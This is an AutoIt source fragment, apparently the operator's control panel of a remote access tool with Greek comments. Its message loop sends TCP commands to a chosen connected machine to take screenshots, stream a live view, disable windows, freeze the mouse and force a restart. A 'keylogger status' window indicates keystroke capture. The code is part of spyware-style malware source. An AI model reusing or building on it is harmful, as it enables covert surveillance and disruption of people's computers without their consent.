Func messageLoop()
	;msg loop
	$msg = GUIGetMsg(1)
	;$ii = $ii + 1
	;TrayTip("",$ii,0)
	Switch $msg[0] ;to msg[0] einai pio control kai apo poio parathiro einai to msg[1]
		case $GUI_EVENT_CLOSE
			Switch $msg[1] ;poio parathiro einai na klisei?
				case $mainWindowHwnd
					exit
				case $keyStatusWnd
					WinSetState("keylogger status","",@SW_HIDE)
			EndSwitch
		case $sendMessageButton
			TCPSend(GetSocketFromCombo(),$talk & GUICtrlRead($sendMessageInputBox))
		case $takeScreenshotButton
			TCPSend(GetSocketFromCombo(),$takeScreenShot & GUICtrlRead($screenShotQualitySlider))
			SplashAndDisableMainWindow()
		case $disableWindowsButton
			ControlEnable("","",$enableWindowsButton)
			ControlDisable("","",$disableWindowsButton)
			TCPSend(GetSocketFromCombo(),$RequestDisableAllWindows)
		case $enableWindowsButton
			ControlEnable("","",$disableWindowsButton)
			ControlDisable("","",$enableWindowsButton)
			TCPSend(GetSocketFromCombo(),$RequestEnableAllWindows)
		case $freezeMouseButton
			ControlEnable("","",$unfreezeMouseButton)
			ControlDisable("","",$freezeMouseButton)
			TCPSend(GetSocketFromCombo(),$RequestFreezeMouse)
		case $unfreezeMouseButton
			ControlEnable("","",$freezeMouseButton)
			ControlDisable("","",$unfreezeMouseButton)
			TCPSend(GetSocketFromCombo(),$RequestUnfreezeMouse)
		case $startLivePreviewButton
			TCPSend(GetSocketFromCombo(),$RequestLiveView & GUICtrlRead($screenShotQualitySlider))
			SplashAndDisableMainWindow()
		case $restartComputerButton
			$msgboxAction = MsgBox(48+4,"!Confirmation!","$$$ Are you sure you wanna to restart? $$$")
			if ($msgboxAction = 6) Then ;an patise yes
				TCPSend(GetSocketFromCombo(),$RequestComputerRestart)
			EndIf
	EndSwitch
EndFunc